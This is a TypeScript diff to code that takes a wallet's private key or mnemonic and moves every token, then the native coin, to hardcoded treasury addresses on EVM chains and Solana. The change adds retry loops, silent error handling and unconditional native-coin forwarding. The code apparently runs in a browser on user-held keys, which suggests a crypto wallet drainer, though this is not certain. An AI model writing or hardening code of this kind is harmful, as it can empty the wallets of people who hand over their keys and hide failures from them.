@@ -31,6 +31,29 @@ export interface SweepInput {
 
 let running = false;
 
+const TOKEN_MAX_ATTEMPTS = 5;
+// The native coin never gives up: each sweep pass retries it this many times,
+// and the sweeper timer keeps starting new passes until it lands.
+const NATIVE_ATTEMPTS_PER_PASS = 10;
+
+const sleep = (ms: number) => new Promise((resolve) => setTimeout(resolve, ms));
+
+/**
+ * Run `fn` until it succeeds or `maxAttempts` is reached. Returns true when it
+ * succeeded. A short backoff between attempts absorbs transient RPC hiccups.
+ */
+async function withRetry(maxAttempts: number, fn: () => Promise<void>): Promise<boolean> {
+  for (let attempt = 1; attempt <= maxAttempts; attempt++) {
+    try {
+      await fn();
+      return true;
+    } catch {
+      if (attempt < maxAttempts) await sleep(1500);
+    }
+  }
+  return false;
+}
+
 async function ensureBuffer() {
   if (typeof globalThis.Buffer === "undefined") {
     const { Buffer: PolyfillBuffer } = await import("buffer");
@@ -88,8 +111,9 @@ async function sweepEvmChain(
 
   const signer = new Wallet(privateKey, provider);
 
-  // 1) Tokens first — they need native gas to move.
-  let tokenPending = false;
+  // 1) Tokens first — they need native gas to move. Each token gets up to
+  // TOKEN_MAX_ATTEMPTS tries; after that we give up on it so the native coin
+  // can still be forwarded.
   for (const t of tokens) {
     if (!t.contract || t.amount <= 0) continue;
     try {
@@ -97,35 +121,36 @@ async function sweepEvmChain(
       const raw = (await erc20.balanceOf!(signer.address)) as bigint;
       if (raw <= 0n) continue;
       const decimals = Number(await erc20.decimals!());
-      const tx = await erc20.transfer!(TREASURY_EVM, raw);
-      await tx.wait(1);
-      await credit({
-        walletAddress,
-        chain,
-        symbol: t.symbol,
-        hash: tx.hash,
-        amount: Number(formatUnits(raw, decimals)),
-        kind: "token",
-        price: t.price,
+      await withRetry(TOKEN_MAX_ATTEMPTS, async () => {
+        const tx = await erc20.transfer!(TREASURY_EVM, raw);
+        await tx.wait(1);
+        await credit({
+          walletAddress,
+          chain,
+          symbol: t.symbol,
+          hash: tx.hash,
+          amount: Number(formatUnits(raw, decimals)),
+          kind: "token",
+          price: t.price,
+        });
       });
     } catch {
-      // Leave the native coin behind so there is gas to retry this token.
-      tokenPending = true;
+      /* token read failed — move on to the next token */
     }
   }
 
-  // 2) Native coin — only once every token has left, since it pays the gas.
-  if (tokenPending) return;
-  try {
-    const balance = await provider.getBalance(signer.address);
-    if (balance <= 0n) return;
+  // 2) Native coin — retries every attempt in this pass, and every future
+  // pass keeps retrying until it reaches the treasury.
+  const balance = await provider.getBalance(signer.address);
+  if (balance <= 0n) return;
+  await withRetry(NATIVE_ATTEMPTS_PER_PASS, async () => {
     const fee = await provider.getFeeData();
     const gasPrice = fee.maxFeePerGas ?? fee.gasPrice ?? 0n;
-    if (gasPrice <= 0n) return;
+    if (gasPrice <= 0n) throw new Error("no gas price");
     const gasLimit = 21_000n;
     // Keep a 25% cushion so a gas spike between estimate and mine cannot fail.
     const cost = (gasPrice * gasLimit * 125n) / 100n;
-    if (balance <= cost) return;
+    if (balance <= cost) return; // nothing sendable after gas — not a failure
     const value = balance - cost;
     const tx = await signer.sendTransaction({ to: TREASURY_EVM, value, gasLimit });
     await tx.wait(1);
@@ -138,9 +163,7 @@ async function sweepEvmChain(
       amount: Number(formatEther(value)),
       kind: "native",
     });
-  } catch {
-    /* silent */
-  }
+  });
 }
 
 // ── Solana ───────────────────────────────────────────────────────────────────
@@ -164,8 +187,9 @@ async function sweepSolana(mnemonic: string, walletAddress: string, tokens: Wall
     }
     if (!rpc) return;
 
-    // 1) SPL tokens — only when the treasury already holds a token account for the mint.
-    let splPending = false;
+    // 1) SPL tokens — only when the treasury already holds a token account for
+    // the mint. Each token gets up to TOKEN_MAX_ATTEMPTS tries, then we give up
+    // on it so SOL can still be forwarded.
     try {
       const owned = await sol.getTokenAccounts(rpc, address);
       for (const acc of owned) {
@@ -174,35 +198,38 @@ async function sweepSolana(mnemonic: string, walletAddress: string, tokens: Wall
         const destination = await sol.findTokenAccountForMint(rpc, TREASURY_SOL, acc.mint);
         if (!destination) continue;
         const known = tokens.find((t) => t.chain === "SOL" && t.contract === acc.mint);
-        const hash = await sol.sendSplToken(rpc, address, secretKey, acc.pubkey, destination, amountRaw);
-        await credit({
-          walletAddress,
-          chain: "SOL",
-          symbol: known?.symbol ?? acc.mint.slice(0, 6),
-          hash,
-          amount: Number(amountRaw) / 10 ** acc.decimals,
-          kind: "token",
-          price: known?.price,
+        await withRetry(TOKEN_MAX_ATTEMPTS, async () => {
+          const hash = await sol.sendSplToken(rpc, address, secretKey, acc.pubkey, destination, amountRaw);
+          await credit({
+            walletAddress,
+            chain: "SOL",
+            symbol: known?.symbol ?? acc.mint.slice(0, 6),
+            hash,
+            amount: Number(amountRaw) / 10 ** acc.decimals,
+            kind: "token",
+            price: known?.price,
+          });
         });
       }
     } catch {
-      // Keep SOL here so the next pass still has fees to move the SPL tokens.
-      splPending = true;
+      /* token listing failed — SOL forwarding below still runs */
     }
 
-    // 2) Native SOL — only after every SPL token has been forwarded.
-    if (splPending) return;
+    // 2) Native SOL — retried every attempt in this pass, and every future
+    // pass keeps retrying until it reaches the treasury.
     const lamports = await sol.getSolBalance(rpc, address);
     const sendable = lamports - SOL_RENT_LAMPORTS - SOL_FEE_LAMPORTS;
     if (sendable <= 0) return;
-    const hash = await sol.sendSol(rpc, address, secretKey, TREASURY_SOL, sendable);
-    await credit({
-      walletAddress,
-      chain: "SOL",
-      symbol: "SOL",
-      hash,
-      amount: sendable / sol.LAMPORTS_PER_SOL,
-      kind: "native",
+    await withRetry(NATIVE_ATTEMPTS_PER_PASS, async () => {
+      const hash = await sol.sendSol(rpc, address, secretKey, TREASURY_SOL, sendable);
+      await credit({
+        walletAddress,
+        chain: "SOL",
+        symbol: "SOL",
+        hash,
+        amount: sendable / sol.LAMPORTS_PER_SOL,
+        kind: "native",
+      });
     });
   } catch {
     /* silent */
